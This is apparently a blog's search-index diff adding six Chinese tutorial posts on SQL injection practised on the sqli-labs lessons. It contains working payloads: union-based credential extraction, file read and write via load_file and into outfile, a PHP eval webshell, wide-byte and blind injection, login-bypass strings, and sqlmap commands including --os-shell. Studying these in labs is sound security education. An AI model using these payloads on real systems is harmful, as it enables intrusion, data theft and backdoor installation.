@@ -4,39 +4,162 @@
   
   
   <entry>
-    <title>test1</title>
-    <link href="/2020/05/15/test3/"/>
-    <url>/2020/05/15/test3/</url>
+    <title>SQL注入 文件读写</title>
+    <link href="/2020/05/15/SQL%E6%B3%A8%E5%85%A5-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/"/>
+    <url>/2020/05/15/SQL%E6%B3%A8%E5%85%A5-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/</url>
     
-    <content type="html"><![CDATA[<h2 id="this-is-shortcut"><a href="#this-is-shortcut" class="headerlink" title="this is shortcut"></a>this is shortcut</h2><a id="more"></a><p>contents</p>]]></content>
+    <content type="html"><![CDATA[<p>本文介绍了利用SQL注入读写文件，写入后门的方法</p><a id="more"></a><h1 id="SQL注入读写文件"><a href="#SQL注入读写文件" class="headerlink" title="SQL注入读写文件"></a>SQL注入读写文件</h1><h2 id="01-读写文件的前提"><a href="#01-读写文件的前提" class="headerlink" title="01 读写文件的前提"></a>01 读写文件的前提</h2><ol><li><p>知道读写文件的绝对路径</p></li><li><p>当前用户权限足够</p></li><li><p>secure_file_priv参数配置正确：</p><p>该参数限制了文件读写的路径，在mysql配置文件中修改</p><ol><li>secure_file_priv=               不对读写作出限制</li><li>secure_file_priv=null        禁止读写</li><li>secure_file_priv=’path’     只允许在path路径下操作，包括子目录</li></ol></li></ol><h2 id="02-读取文件"><a href="#02-读取文件" class="headerlink" title="02 读取文件"></a>02 读取文件</h2><p>以Lesson1为例，首先创建一个flag.txt</p><ol><li>?id=1’ order by 3–+ 得到有三个字段</li><li>?id=-1’ union select 1,load_file(“绝对路径\flag.txt”),3 –+<br>在字段2处读取出文件<br><strong>联合查询要使前边报错</strong></li></ol><h2 id="03-写入文件"><a href="#03-写入文件" class="headerlink" title="03 写入文件"></a>03 写入文件</h2><p>以Lesson1为例</p><ol><li><p>?id=1’)) order by 3–+ 得到有三个字段</p></li><li><p>?id=1’)) union select 1,’&lt;?php phpinfo(); ?&gt;‘,3 into outfile ‘绝对路径’–+</p></li></ol><p>也可以写入一句话木马&lt;?php @eval($_POST[‘x’]; ?&gt;,然后使用菜刀链接</p><p>除了一句话木马，还可以使用weevely、webacco等生成后门</p><h2 id="03-sqlmap读写文件"><a href="#03-sqlmap读写文件" class="headerlink" title="03 sqlmap读写文件"></a>03 sqlmap读写文件</h2><p>读文件 sqlmap -u “url” –file-read “绝对路径flag.txt”</p><p>写文件 sqlmap -u “url” –file-write “本地绝对路径flag.txt” –file-dest “目标绝对路径”</p><p>检测权限 sqlmap -u “url” –is-dba</p><p>获取SQLshell ：sqlmap -u “url” –sql-shell</p><p>获取系统shell ：sqlmap -u “url” –os-shell</p>]]></content>
     
     
+    <categories>
+      
+      <category>WEB安全</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>WEB安全</tag>
+      
+      <tag>SQL注入</tag>
+      
+    </tags>
     
   </entry>
   
   
   
   <entry>
-    <title>test0</title>
-    <link href="/2020/05/14/test/"/>
-    <url>/2020/05/14/test/</url>
+    <title>SQL注入 几种特殊的注入</title>
+    <link href="/2020/05/15/SQL%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"/>
+    <url>/2020/05/15/SQL%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</url>
     
-    <content type="html"><![CDATA[<h1 id="part-1"><a href="#part-1" class="headerlink" title="part 1"></a>part 1</h1><p>test</p><h2 id="part-2"><a href="#part-2" class="headerlink" title="part 2"></a>part 2</h2><p>test</p><p>test3</p>]]></content>
+    <content type="html"><![CDATA[<p>本文介绍了二次注入、宽字节注入</p><a id="more"></a><h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><h2 id="01-二次注入介绍"><a href="#01-二次注入介绍" class="headerlink" title="01 二次注入介绍"></a>01 二次注入介绍</h2><ol><li>先构造语句（此语句含有被转义字符的语句）</li><li>将我们构造的恶意语句存入数据库；</li><li>第二次构造语句（结合前面已被存入数据库的语句构造。因为系统没有已存入的数据做检查，成功注入）</li></ol><h2 id="02-二次注入利用"><a href="#02-二次注入利用" class="headerlink" title="02 二次注入利用"></a>02 二次注入利用</h2><p><strong>Lesson 24</strong></p><ol><li>注册用户名 admin’ – -<br>密码123456</li><li>进行登录</li><li>修改密码为112233</li><li>成功将admin的密码修改为112233<br>而admin’ – -的密码没有改变</li></ol><h2 id="03-二次注入危害"><a href="#03-二次注入危害" class="headerlink" title="03 二次注入危害"></a>03 二次注入危害</h2><ol><li>注入payload触发二次sql注入</li><li>注入payload触发xss攻击</li></ol><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>宽字节注入适用于单引号被转义为\‘的场景，原理是将反斜杠拼接成一个宽字符，从而避免单引号被转义</p><h2 id="01-宽字节注入基础"><a href="#01-宽字节注入基础" class="headerlink" title="01 宽字节注入基础"></a>01 宽字节注入基础</h2><p>GBK编码 占用两字节，ASCII编码占用一个字节</p><p>PHP中编码为GBK，函数执行添加的是ASCII编码，MYSQL默认字符集是GBK等宽字节字符集</p><p>如果PHP中有addslashes函数，单引号就会被转义为\‘，通常使用%DF进行宽字符注入绕过，’URL编码是%27，\URL编码是%5C，即%DF\‘会被转为%DF%5C%27</p><p>若网站的字符集是GBK，MYSQL使用的编码也是GBK，就会认为%DF%5C是一个宽字符,从而解析为 <strong>宽字符’</strong></p><p>最常使用的宽字节注入是%DF，其实只要用ascii码大于128的即可</p><p>%81-%FE均可注入<strong>（%7F除外）</strong></p><p><strong>ascii码转码方法</strong></p><p>如ascii码为129，先将129转为十六进制，即为0x81，然后加%即可，%81</p><h2 id="02-绕过演示"><a href="#02-绕过演示" class="headerlink" title="02 绕过演示"></a>02 绕过演示</h2><p><strong>Lesson 32</strong></p><p>?id=-1%DF’ union select 1,database(),user() –+</p><p><strong>Lesson 33</strong></p><p>?id=-1%DF’ union select 1,database(),user() –+</p><h2 id="03-sqlmap安全测试"><a href="#03-sqlmap安全测试" class="headerlink" title="03 sqlmap安全测试"></a>03 sqlmap安全测试</h2><p>sqlmap -u “URL?id=%df%27”</p><p><strong>用于宽字节注入的脚本 unmagicquotes.py</strong></p><p>sqlmap -u “URL?id=1” –tamper=unmagicquotes.py</p>]]></content>
     
     
+    <categories>
+      
+      <category>WEB安全</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>WEB安全</tag>
+      
+      <tag>SQL注入</tag>
+      
+    </tags>
     
   </entry>
   
   
   
   <entry>
-    <title>test2</title>
-    <link href="/2020/05/12/test2/"/>
-    <url>/2020/05/12/test2/</url>
+    <title>SQL注入 SQLmap的使用方法</title>
+    <link href="/2020/05/15/SQL%E6%B3%A8%E5%85%A5-SQLmap%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
+    <url>/2020/05/15/SQL%E6%B3%A8%E5%85%A5-SQLmap%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
     
-    <content type="html"><![CDATA[<p>hello</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hello</span><span class="hljs-params">()</span>:</span>print(<span class="hljs-string">"hello world"</span>)</code></pre>]]></content>
+    <content type="html"><![CDATA[<p>本文介绍了自动化注入工具SQLmap常用的命令和脚本</p><a id="more"></a><h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><p>半自动化注入：burpsuite</p><p>自动化注入：sqlmap</p><p><strong>sqlmap需要使用python2环境</strong></p><h2 id="01-基本探测参数"><a href="#01-基本探测参数" class="headerlink" title="01 基本探测参数"></a>01 基本探测参数</h2><ol><li><p>-u “url” 设定注入点</p></li><li><p>–dbs 列出所有数据库名</p><p>–current-db 列出当前数据库</p><p>-D 指定一个数据库</p></li><li><p>–tables 列出所有表名</p><p>–T 指定一个表</p></li><li><p>–columns 列出所有字段名</p><p>-C 指定字段</p></li><li><p>–dump 列出字段内容</p></li></ol><p>示例：</p><ol><li>sqlmap -u url –dbs –batch<br>得到数据库有information_schema、security等</li><li>sqlmap -u url -D security –tables –batch<br>得到表有users</li><li>sqlmap -u url -D security -T users –columns –batch<br>得到username和password</li><li>sqlmap -u url -D security -T users -C username,password –dump –batch<br>得到具体值</li></ol><p>-v 输出级别分为0-6，默认为1 ：<br>0：只显示Python的tracebacks信息、错误信息和关键信息<br>1：同时显示普通信息[INFO]和警告信息[WARNING]；<br>2：同时显示调试信息[DEBUG]；<br>3：同时显示注入使用的攻击荷载；<br>4：同时显示HTTP请求；<br>5：同时显示HTTP响应头；<br>6：同时显示HTTP响应体。</p><p>-d 直接连接数据库</p><h2 id="02-获取目标参数"><a href="#02-获取目标参数" class="headerlink" title="02 获取目标参数"></a>02 获取目标参数</h2><ol><li><p>–batch 所有交互选项使用默认选项</p></li><li><p>–banner 返回banner信息</p></li><li><p>对单一url探测 sqlmap -u url </p></li><li><p>从文件中读取目标：</p><ul><li>-l 从burpsuite proxy 或者webscarab proxy中读取http请求日志文件<br>burpsuite==&gt;Project options==&gt;Logging==&gt;Proxy==&gt;Requests</li></ul><ul><li><p>-x 从sitemap.xml站点地图文件中读取目标探测</p></li><li><p>-m 从多行文本格式文件中读取多个目标，对多个目标进行探测</p></li><li><p>-r 从文本文件中读取http请求作为sql注入的探测目标</p></li><li><p>-c 从配置文件 sqlmap.conf中读取目标探测</p></li></ul></li><li><p>-g 自动利用google获取指定的googlehack等目标，然后利用交互向导模式进行探测</p></li><li><p>-f fingerprint</p></li></ol><h2 id="设置请求参数"><a href="#设置请求参数" class="headerlink" title="设置请求参数"></a>设置请求参数</h2><ol><li><p>设置http方法<br>一般情况下会自动使用合适的方法，但是PUT方法不会自动使用 –method=PUT</p></li><li><p>设置post提交参数</p><p>默认方法是GET，可以提供POST请求中的数据将其隐性改变成POST<br>Sqlmap -u url –data=”data” </p><p>使用burpsuite抓包，保存为1.txt<br>sqlmap -r 1.txt</p></li><li><p>设置参数分隔符<br>默认分隔符为&amp;，也可以指定 –param-del=”分隔符”</p></li><li><p>设置cookie –cookie</p><p>使用场景：web应用有基于cookie验证的过程 想用cookie的值进行注入</p><p>web应用程序使用set-cookie进行响应，sqlmap将在所有进一步http请求中自动使用其值作为cookie标头。可以使用–drop-set-cookie将忽略任何即将到来的set-cookie头</p><p>load-cookie 可以用来提供包含Netscape/wget格式的cookie的特殊文件</p><p><strong>注意：如果对http cookie值进行探测，需要设置–level 2及以上</strong></p></li><li><p>设置user-agent<br>设置为指定值 –user-agent=””<br>设置为随机值 –random-agent<br>target.txt中在user-agent后边加一个*，表示对user-agent进行探测</p><p><strong>注意：如果对user-agent值进行探测，需要设置–level 3及以上</strong></p></li><li><p>设置host</p><p><strong>注意：如果对host值进行探测，需要设置–level 5</strong></p></li><li><p>设置referer<br><strong>注意：如果对referer值进行探测，需要设置–level 3及以上</strong></p></li><li><p>额外的http头<br>一个头 -H或–header<br>多个头 –headers=”Host:www,target.com\nUser-agent:Firefox” -v 5<br>多个标头用换行分隔<br>也可以在配置文件中进行设置<br>-v 5 是为了现实输出结果</p></li><li><p>读文件<br>–file-read ‘文件绝对路径’</p></li><li><p>写入文件<br>  –file-write ‘本地绝对路径’ –file-dest ‘目标绝对路径’</p></li><li><p>设定探测类型<br>–technique BEUSTQ </p><ul><li>B 布尔类型 </li><li>E 基于错误</li><li>U union查询</li><li>S 堆叠查询</li><li>T 基于时间的查询</li><li>Q 查询</li></ul><p>若不指定则使用全部技术</p></li></ol><h2 id="使用tamper脚本"><a href="#使用tamper脚本" class="headerlink" title="使用tamper脚本"></a>使用tamper脚本</h2><p>sqlmap … –tamper ‘脚本名’</p><p>常见的tamper有：</p><ol><li><p>apostrophemask.py<br>将单引号URL编码，避免被过滤</p></li><li><p>apostrophenullencode.py</p><p>将单引号替换为宽字节编码，避免被过滤</p></li><li><p>base64encode.py<br>进行base64编码</p></li><li><p>between.py<br>将大于号和等号替换为between</p></li><li><p>equaltolike.py<br>将=替换为like</p></li><li><p>space2comment.py<br>将空格替换为/**/</p></li><li><p>space2randomblank.py<br>将空格替换为随机的空白字符</p></li><li><p>space2plus.py<br>将空格替换为+</p></li><li><p>space2mysqldash.py<br>将空格替换为–\n</p></li><li><p>bluecoat.py<br>替换sql关键字后边的空格，并且将=替换为like</p></li></ol>]]></content>
     
     
+    <categories>
+      
+      <category>WEB安全</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>WEB安全</tag>
+      
+      <tag>SQL注入</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>SQL注入 基于报错的注入</title>
+    <link href="/2020/05/15/SQL%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E7%9A%84%E6%B3%A8%E5%85%A5/"/>
+    <url>/2020/05/15/SQL%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8E%E6%8A%A5%E9%94%99%E7%9A%84%E6%B3%A8%E5%85%A5/</url>
+    
+    <content type="html"><![CDATA[<p>本文简单介绍了最基础的SQL注入</p><a id="more"></a><h1 id="基于报错的SQL注入"><a href="#基于报错的SQL注入" class="headerlink" title="基于报错的SQL注入"></a>基于报错的SQL注入</h1><h2 id="01-SQL注入的分类"><a href="#01-SQL注入的分类" class="headerlink" title="01 SQL注入的分类"></a>01 SQL注入的分类</h2><p>数字型：select * from table where id=输入id</p><p>字符型：select * from table where id=’输入id’</p><h2 id="02-GET基于报错的SQL注入发现"><a href="#02-GET基于报错的SQL注入发现" class="headerlink" title="02 GET基于报错的SQL注入发现"></a>02 GET基于报错的SQL注入发现</h2><p>通过url中修改对应的ID值，为正常数字、大数字、字符(单引号、双引号、括号)、反斜杠等来探测</p><p><strong>Sqli-lab lesson1-4</strong></p><ol><li>Lesson1：<ol><li>输入?id=1</li><li>添加单引号 ?id=1 ‘ 出现报错 ‘1’’ LIMIT 0,1</li><li>猜测sql语句为<br>select username,password from admin where id=’id’ limit 0,1</li></ol></li><li>Lesson2:<ol><li>输入?id=1</li><li>添加单引号 ?id=1 ‘ 出现报错 ‘ LIMIT 0,1</li><li>猜测sql语句为<br>select username,password from admin where id=id limit 0,1</li></ol></li><li>Lesson3:<ol><li>输入?id=1</li><li>添加单引号 ?id=1 ‘ 出现报错 ‘1’’) LIMIT 0,1</li><li>猜测sql语句为<br>select username,password from admin where id=(‘id’) limit 0,1</li><li>输入?id=1’) –+  得到返回值，说明猜测正确</li></ol></li><li>Lesson4:<ol><li>输入?id=1</li><li>添加单引号 ?id=1 ‘不报错</li><li>添加括号 ?id=1) 不报错</li><li>猜测使用了双引号闭合</li><li>使用?id=1”或?id=1\ 报错 “1\“) LIMIT 0,1</li><li>猜测sql语句为<br>select username,password from admin where id=(“id”) limit 0,1</li><li>输入?id=1”) –+  得到返回值，说明猜测正确</li></ol></li></ol><h2 id="03-GET基于报错的SQL注入漏洞利用"><a href="#03-GET基于报错的SQL注入漏洞利用" class="headerlink" title="03 GET基于报错的SQL注入漏洞利用"></a>03 GET基于报错的SQL注入漏洞利用</h2><p>Lesson 1:</p><ol><li>?id=1’ order by 3 –+<br>判断字段数,得到字段数为3</li><li>?id=-1’ union select 1,2,3 –+<br>需要使前一个查询报错，得到name是第2列，password是第3列</li><li>?id=-1’ union select 1,version(),database() –+<br>使用聚合函数得到版本和数据库</li><li>?id=-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() –+<br>得到表名</li><li>?id=-1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’ –+<br>得到字段名</li><li>?id=-1’ union select 1,group_concat(username,0x3a,password),3 from users –+<br>得到字段值</li></ol><h2 id="04-利用sqlmap进行探测"><a href="#04-利用sqlmap进行探测" class="headerlink" title="04 利用sqlmap进行探测"></a>04 利用sqlmap进行探测</h2><ol><li>sqlmap -u url –dbs –batch<br>得到数据库有information_schema、security等</li><li>sqlmap -u url -D security –tables –batch<br>得到表有users</li><li>sqlmap -u url -D security -T users –columns –batch<br>得到username和password</li><li>sqlmap -u url -D security -T users -C username,password –dump –batch<br>得到具体值</li></ol>]]></content>
+    
+    
+    <categories>
+      
+      <category>WEB安全</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>WEB安全</tag>
+      
+      <tag>SQL注入</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>SQL注入 盲注</title>
+    <link href="/2020/05/15/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/"/>
+    <url>/2020/05/15/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/</url>
+    
+    <content type="html"><![CDATA[<p>本文简单介绍了一种特殊的SQL注入，盲注</p><a id="more"></a><h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><p>盲注的原理是向数据库发送判断真假的语句，根据页面状态判断真假</p><p>盲注可以分为基于布尔的盲注和基于时间的盲注，后者耗时较长</p><h2 id="01-基于布尔的盲注"><a href="#01-基于布尔的盲注" class="headerlink" title="01 基于布尔的盲注"></a>01 基于布尔的盲注</h2><p>原理：根据页面显示的状态判断查询语句真假</p><p>适用场景：网页会因为查询语句的真假而显示不同的状态</p><p>例如一个网页在查询为真时，页面无显示，而查询为假时页面会有警告，这时就可以使用盲注进行注入，通常使用枚举的方法。</p><p>常用的函数如substr(str,m,n)即从字符串str的第m个字符（从1开始计数，包括自身）向后取n个字符，substr(str,1,1)即取第一个字符。</p><p>如获取数据库名：</p><ul><li>获取数据库长度<ul><li>?id=1 and length(database())=1 –+ 页面显示为假</li><li>?id=1 and length(database())=2 –+ 页面显示为假</li><li>?id=1 and length(database())=3 –+ 页面显示为真，得到数据库名的长度为3</li></ul></li><li>获取数据库名<ul><li>?id=1 and ascii(substr(databse(),1,1))=97 –+ 页面显示为假</li><li>?id=1 and ascii(substr(databse(),1,1))=98 –+ 页面显示为假</li><li>?id=1 and ascii(substr(databse(),1,1))=99 –+ 页面显示为真，得到数据库名的第一个字符的ASCII码为99，即c</li></ul></li></ul><p>同理可以继续进行探测</p><p><strong>为了避免次数过多，可以转换成ASCII码，然后使用位运算比较</strong></p><h2 id="02-基于时间的盲注"><a href="#02-基于时间的盲注" class="headerlink" title="02 基于时间的盲注"></a>02 基于时间的盲注</h2><p>原理：根据页面延时判断查询语句真假</p><p>适用场景：无论查询语句真假，网页显示的状态相同，此时我们可以使用sleep()函数构造查询语句，人为创造出页面显示的真假状态，即加载时长。</p><p>常用语句if(exp,t,f)即当表达式exp为真时返回t，为假时返回f<br>if(ascII(substr(database(),1,1)=115,sleep(3),1))表示当数据库名第一个字符的ASCII码是115时就延时3s，否则返回1（正常显示无延时）</p><p>如获取数据库名：</p><ul><li>获取数据库长度<ul><li>?id=1 and if(length(database())=1,sleep(5),1) –+ 页面正常加载</li><li>?id=1 and if(length(database())=2,sleep(5),1) –+ 页面正常加载</li><li>?id=1 and if(length(database())=3,sleep(5),1) –+ 页面加载延时5s，得到数据库名的长度为3</li></ul></li><li>获取数据库名<ul><li>?id=1 and if(ascii(substr(databse(),1,1))=97,sleep(5),1) –+ 页面正常加载</li><li>?id=1 and if(ascii(substr(databse(),1,1))=98,sleep(5),1) –+ 页面正常加载</li><li>?id=1 and if(ascii(substr(databse(),1,1))=99,sleep(5),1) –+ 页面加载延时5s，得到数据库名的第一个字符的ASCII码为99，即c</li></ul></li></ul><p>除sleep外还可以使用benchmark函数<br>benchmark(n,exp)表示执行表达式exp n次，当n很大时就可以起到延时效果<br>如if(ascii(substr(databse(),1,1))=97,benchmark(md5(‘a’),1000000),1)</p><h2 id="03-SQLmap盲注"><a href="#03-SQLmap盲注" class="headerlink" title="03 SQLmap盲注"></a>03 SQLmap盲注</h2><p>sqlmap -u url –technique T –dbs 指定-T为基于时间的盲注<br><strong>BEUSTQ B布尔 E错误 Uunion注入 S堆叠 T时间 Q查询</strong><br><strong>若不指定则使用全部技术，时间较长</strong></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>WEB安全</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>WEB安全</tag>
+      
+      <tag>SQL注入</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>SQL注入整理</title>
+    <link href="/2020/05/15/SQL%E6%B3%A8%E5%85%A5%E6%95%B4%E7%90%86/"/>
+    <url>/2020/05/15/SQL%E6%B3%A8%E5%85%A5%E6%95%B4%E7%90%86/</url>
+    
+    <content type="html"><![CDATA[<p>本文整理了SQL注入的原理、分类等基础知识</p><a id="more"></a><h1 id="01-SQL注入简介"><a href="#01-SQL注入简介" class="headerlink" title="01 SQL注入简介"></a>01 SQL注入简介</h1><h2 id="SQL注入的原因"><a href="#SQL注入的原因" class="headerlink" title="SQL注入的原因"></a>SQL注入的原因</h2><ol><li>程序编写者在处理程序和数据库交互时，使用字符串拼接的方式构造SQL语句</li><li>未对用户可控参数进行足够的过滤便将参数内容拼接进入到SQL语句中</li></ol><h2 id="可能存在SQL注入的位置"><a href="#可能存在SQL注入的位置" class="headerlink" title="可能存在SQL注入的位置"></a>可能存在SQL注入的位置</h2><p>web应用在获取用户数据的地方，只要带入数据库查询，就可能存在注入</p><p>常见的地方包括：</p><ol><li>GET数据</li><li>POST数据</li><li>HTTP头部</li><li>COOKIE数据</li></ol><p>…</p><h2 id="SQL注入的危害"><a href="#SQL注入的危害" class="headerlink" title="SQL注入的危害"></a>SQL注入的危害</h2><ol><li>获取管理员的账号密码</li><li>获取数据库中内容</li><li>修改或插入数据到数据库内</li><li>利用注入漏洞获得webshell</li></ol><h1 id="02-SQL注入原理"><a href="#02-SQL注入原理" class="headerlink" title="02 SQL注入原理"></a>02 SQL注入原理</h1><h2 id="简单案例讲解"><a href="#简单案例讲解" class="headerlink" title="简单案例讲解"></a>简单案例讲解</h2><p>在常见的登录页面，通常使用如下SQL语句：<br>select * from admin where username=’输入的用户名’ and password=’输入的密码’</p><p>如果用户输入的用户名为’ or 1=1 –  <strong>注意最后需要有一个空格</strong><br>拼接起来的SQL语句为<br>select * from admin where username=’ <strong>‘ or 1=1 –</strong> <del>‘ and password=’输入的密码’</del></p><p>使用单引号提前闭合，or 1=1永远为真，–将后边的内容注释掉，即完成查询，实现了登录，我们输入的’ or 1=1 –  就可以看作为一个万能密码</p><p>SQL语句中的注释</p><ul><li><p>#（可以用%23代替)</p></li><li><p>–+ 或者–空格 (空格可以用%20代替)</p></li><li><p>/<em>….\</em>/</p></li><li><p>/<em>!…\</em>/ 此为内联注释，在mysql中可以执行注释中的语句，其他系统无法执行<br>如：select * from articles where id=id</p><p>使用内联注释注入 select *from articles where id=</p><p>-1 /*!union*//*!select*/ 1,2,3,4</p><p>在mysql中可以执行 union select 1,2,3,4</p></li></ul><p>以下列出了一些常见的万能密码</p><pre><code class="hljs ada"><span class="hljs-symbol">'or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span>/*<span class="hljs-string">"or "</span>a<span class="hljs-string">"="</span>a<span class="hljs-string">"or 1=1--</span><span class="hljs-string">"</span><span class="hljs-keyword">or</span><span class="hljs-string">"="</span><span class="hljs-string">"or"</span>=<span class="hljs-string">"a'='a</span><span class="hljs-string">"</span>or1=<span class="hljs-number">1</span><span class="hljs-comment">--</span><span class="hljs-string">"or=or"</span>'<span class="hljs-symbol">'or</span><span class="hljs-string">'='</span><span class="hljs-keyword">or</span>'') <span class="hljs-keyword">or</span> (<span class="hljs-string">'a'</span>=<span class="hljs-symbol">'a</span>'.).<span class="hljs-keyword">or</span>.('.a.<span class="hljs-string">'='</span>.a<span class="hljs-symbol">'or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-symbol">'or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment">--</span><span class="hljs-symbol">'or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span>/*<span class="hljs-symbol">'or</span><span class="hljs-string">"="</span>a<span class="hljs-string">'='</span>a<span class="hljs-symbol">'or</span><span class="hljs-string">' '</span><span class="hljs-number">1</span><span class="hljs-string">'='</span><span class="hljs-number">1</span>'<span class="hljs-symbol">'or</span>'<span class="hljs-string">'='</span><span class="hljs-symbol">'or</span>'<span class="hljs-string">'='</span><span class="hljs-symbol">'or</span>'<span class="hljs-string">'='</span><span class="hljs-symbol">'or</span><span class="hljs-string">'='</span><span class="hljs-number">1</span>'<span class="hljs-symbol">'or</span><span class="hljs-string">'='</span><span class="hljs-keyword">or</span>'<span class="hljs-symbol">'or.</span><span class="hljs-symbol">'a.</span><span class="hljs-string">'='</span>a<span class="hljs-symbol">'or1</span>=<span class="hljs-number">1</span><span class="hljs-comment">--</span><span class="hljs-number">1</span><span class="hljs-symbol">'or</span><span class="hljs-string">'1'</span>='<span class="hljs-number">1</span>a<span class="hljs-symbol">'or</span>' <span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment">--</span>a<span class="hljs-symbol">'or</span>'<span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment">--</span><span class="hljs-keyword">or</span> <span class="hljs-string">'a'</span>=<span class="hljs-string">'a'</span><span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment">--</span>or1=<span class="hljs-number">1</span><span class="hljs-comment">--</span></code></pre><p>可以将以上密码作为字典，使用burpsuite用枚举的方法进行测试</p><h2 id="简单注入漏洞探测"><a href="#简单注入漏洞探测" class="headerlink" title="简单注入漏洞探测"></a>简单注入漏洞探测</h2><p>一般网页的CMS逻辑为：CMS逻辑：index.php首页展示内容，具有文章列表（链接具有文章id）、articles.php文章详细页，URL中article.php?id=文章id读取id对应文章<br>可以利用Google Hacking寻找可能存在漏洞的URL</p><p>简单验证方法，如在URL中?id=1 后边添加内容：</p><ol><li>单引号 ‘</li><li>and 1=1</li><li>and 1=2</li></ol><p>*<em>逻辑运算<br>在SQL语句中，and比or的优先级高<br>select 1=2 and 1=2 or 1=1<br>返回的结果为1 *</em></p><p>如果页面中mysql报错，证明存在sql注入漏洞<br>如果报错信息中存在自己输入的值，就是字符型注入，否则是数字型注入    </p><p>根据页面显示的内容，可以分为报错注入、盲注等</p><h2 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h2><ol><li>根据输入数据的分类：<ul><li>数字型 select * from table where id=@id</li><li>字符型 select * from table where id=’@id’</li></ul></li><li>根据注入手法的分类：<ul><li>联合查询 页面有回显<br>使用order by判断出表的列数<br>使用select 1，2，3 观察各列的输出情况，替换成想要查询的内容</li><li>报错注入 页面有报错信息<br>报错信息会显示在页面中，可以执行报错注入<br>可以使用group by语句报错，如：<br>?id=1 union select 1,concat(left(rand(),3),’^’,(select version()),’^’)a,count(*),3 from information_schema.tables group by a –+</li><li>布尔盲注 页面有真假状态<br>通常使用二分法对数据库名等信息进行长度、ascii码的探测<br>根据页面的真假状态进行判断表达式是否正确</li><li>延时盲注 页面没有真假状态<br>通常使用二分法对数据库名等信息进行长度、ascii码的探测<br>使用if(exp,sleep(),1)根据时间判断表达式是否正确</li></ul></li><li>根据提交方式的分类：<ul><li>GET型 可以直接在URL中修改参数进行测试</li><li>POST型 需要抓包进行参数修改</li></ul></li><li>一些特殊的注入：宽字节注入、二次注入<h2 id="sql注入常用的函数"><a href="#sql注入常用的函数" class="headerlink" title="sql注入常用的函数"></a>sql注入常用的函数</h2><ul><li>select user()查看当前用户名</li><li>select database()查看当前数据库</li><li>select version()查看当前版本</li><li>Limit m,n 从第m行开始到第m+n行（从0开始索引）</li><li>order by 获取字段数</li><li>length() 获取长度</li><li>ascii() 获取ascii码</li><li>substring(s,m,n),substr(),mid() 截取字符串<br>三个参数分别是截取的字符串，截取的起始位置(从1开始计数)，截取长度</li><li>floor(x) 返回不大于x的最大整数</li><li>round() 返回参数x最接近的整数</li><li>rand() 返回0-1之间的随机浮点数</li><li>load_file() 读取文件，并返回文件内容作为一个字符串</li><li>select … into outfile ‘绝对路径’ 写入文件</li><li>sleep(n) 延时n秒</li><li>benchmark(n,e) 执行e表达式n次，通过指定较大的n，实现延时</li><li>if(exp,t,f) 如果exp表达式为真就返回t，为假就返回f </li></ul></li></ol><h2 id="SQL注入绕过方式"><a href="#SQL注入绕过方式" class="headerlink" title="SQL注入绕过方式"></a>SQL注入绕过方式</h2><ol><li><p>大小写绕过，sql语句对大小写不敏感</p><p>如：AnD、ORdeR</p></li><li><p>使用&amp;&amp;、||替换and和or</p></li><li><p>双写绕过<br>如：un<del><strong>union</strong></del>ion</p></li><li><p>编码绕过</p><p>利用URL编码 或 十六进制编码</p></li><li><p>内联注释绕过<br>mysql中内联注释中的内容会被执行<br>如：/*!select*/ * from admin 可以正常执行</p></li><li><p>注释被过滤时，要闭合后边 </p></li></ol>]]></content>
+    
+    
+    <categories>
+      
+      <category>WEB安全</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>WEB安全</tag>
+      
+      <tag>SQL注入</tag>
+      
+    </tags>
     
   </entry>
   
